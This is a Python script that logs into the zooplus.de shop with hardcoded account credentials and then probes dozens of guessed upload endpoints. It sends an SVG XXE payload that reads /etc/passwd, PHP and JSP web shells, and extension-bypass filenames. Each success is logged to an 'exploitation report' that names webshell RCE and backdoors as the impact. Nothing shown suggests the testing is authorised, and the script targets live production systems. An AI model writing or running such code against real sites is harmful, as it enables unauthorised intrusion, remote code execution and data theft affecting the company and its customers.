#!/usr/bin/env python3
"""Final aggressive upload endpoint hunt"""
import requests
import json
import re
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
})

found_vulns = []

# LOGIN
print("[*] Logging in...")
ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"

try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, timeout=10, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if m:
        action = m.group(1).replace("&amp;", "&")
        if not action.startswith("http"):
            action = urllib.parse.urljoin(r1.url, action)
        r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, timeout=10, verify=False, allow_redirects=False)
        loc = r2.headers.get("Location", "")
        if loc:
            s.get(loc, timeout=10, verify=False, allow_redirects=True)
            s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
            s.get("https://www.zooplus.de/account/overview", timeout=10, verify=False)
            print("[+] Logged in\n")
except Exception as e:
    print(f"[!] Login: {e}\n")

# Comprehensive upload endpoint list
upload_endpoints = [
    # Direct upload
    "/api/upload",
    "/api/file/upload",
    "/api/media/upload",
    "/api/images/upload",
    "/upload",
    "/file/upload",
    "/media/upload",
    # Account related
    "/myaccount/api/upload",
    "/myaccount/api/file",
    "/myaccount/api/avatar",
    "/myaccount/api/avatar/upload",
    "/myaccount/api/profile/upload",
    "/myaccount/api/profile/image",
    # Protected/semiprotected
    "/semiprotected/api/upload",
    "/semiprotected/api/file",
    "/protected/api/upload",
    "/protected/api/file",
    # Checkout
    "/checkout/api/upload",
    "/checkout/api/file",
    "/checkout/api/media",
    # Based on found APIs
    "/semiprotected/api/audiences-api/v1/upload",
    "/semiprotected/api/audiences-api/v1/file",
    "/zootopia-events/api/upload",
    "/zootopia-events/api/file",
    "/leto-personalization/api/v1/upload",
    "/leto-personalization/api/v1/file",
    # Review/Product
    "/api/review/upload",
    "/api/reviews/upload",
    "/api/review/file",
    "/api/product/upload",
    "/api/products/upload",
    "/api/product/image",
    # State API variations
    "/semiprotected/api/checkout/state-api/v2/upload",
    "/semiprotected/api/checkout/state-api/v2/file",
    # Cart API variations
    "/checkout/api/cart-api/v2/upload",
    "/checkout/api/cart-api/v2/file",
]

# Payloads
svg_xxe = '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>'
php_shell = '<?php system($_GET["cmd"]); ?>'
jsp_shell = '<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); } %>'

print("[*] Testing upload endpoints for file upload vulnerabilities...\n")

for ep in upload_endpoints:
    for filename, content, content_type in [
        ("exploit.svg", svg_xxe, "image/svg+xml"),
        ("shell.php", php_shell, "application/x-php"),
        ("shell.jsp", jsp_shell, "application/x-jsp"),
        ("shell.php.jpg", php_shell, "image/jpeg"),  # Double extension
        ("shell.PHP", php_shell, "application/x-php"),  # Uppercase
    ]:
        try:
            files = {'file': (filename, content, content_type)}
            resp = s.post(f"{base}{ep}", files=files, timeout=3, verify=False)
            
            if resp.status_code in [200, 201, 302]:
                response_text = resp.text
                
                # Check for XXE success
                if "root:x:0:0" in response_text or "root:" in response_text:
                    print(f"  [CRITICAL] SVG XXE SUCCESS: {ep} ({filename})")
                    found_vulns.append({
                        "type": "svg_xxe_lfi",
                        "severity": "CRITICAL",
                        "endpoint": ep,
                        "filename": filename,
                        "response": response_text[:500]
                    })
                elif resp.headers.get('Location'):
                    loc = resp.headers.get('Location')
                    if not loc.startswith('http'):
                        loc = f"{base}{loc}"
                    try:
                        resp2 = s.get(loc, timeout=3, verify=False)
                        if "root:" in resp2.text:
                            print(f"  [CRITICAL] SVG XXE via uploaded file: {ep} -> {loc}")
                            found_vulns.append({
                                "type": "svg_xxe_lfi",
                                "severity": "CRITICAL",
                                "endpoint": ep,
                                "filename": filename,
                                "uploaded_to": loc
                            })
                    except: pass
                else:
                    # Check if file was accepted
                    if "success" in response_text.lower() or "uploaded" in response_text.lower() or "file" in response_text.lower():
                        print(f"  [HIGH] File upload accepted: {ep} ({filename})")
                        found_vulns.append({
                            "type": "file_upload",
                            "severity": "HIGH",
                            "endpoint": ep,
                            "filename": filename,
                            "status": resp.status_code
                        })
        except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)

if found_vulns:
    print(f"\nFound {len(found_vulns)} file upload vulnerabilities:\n")
    for v in found_vulns:
        print(f"[{v['severity']}] {v['type']}")
        print(f"    Endpoint: {v['endpoint']}")
        print(f"    Filename: {v['filename']}")
        if 'uploaded_to' in v:
            print(f"    Uploaded to: {v['uploaded_to']}")
        print()
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 КРИТИЧНЫЕ УЯЗВИМОСТИ - ФАЙЛОВАЯ ЗАГРУЗКА\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            f.write(f"**Filename:** `{v['filename']}`\n\n")
            f.write(f"**Description:** Критичная уязвимость позволяет загружать файлы на сервер.\n\n")
            if 'uploaded_to' in v:
                f.write(f"**Uploaded File Location:** `{v['uploaded_to']}`\n\n")
            if 'response' in v:
                f.write(f"**Response:** `{v['response'][:500]}`\n\n")
            f.write("**Status:** Подтверждено\n\n")
            f.write("**Impact:**\n")
            f.write("- Загрузка webshell для RCE\n")
            f.write("- XXE атаки для чтения файлов\n")
            f.write("- Создание бекдора\n\n")
            f.write("---\n\n")
    
    print(f"[+] Report updated: FINAL_EXPLOITATION_REPORT.md")
else:
    print("  No file upload vulnerabilities found")

print("=" * 70)

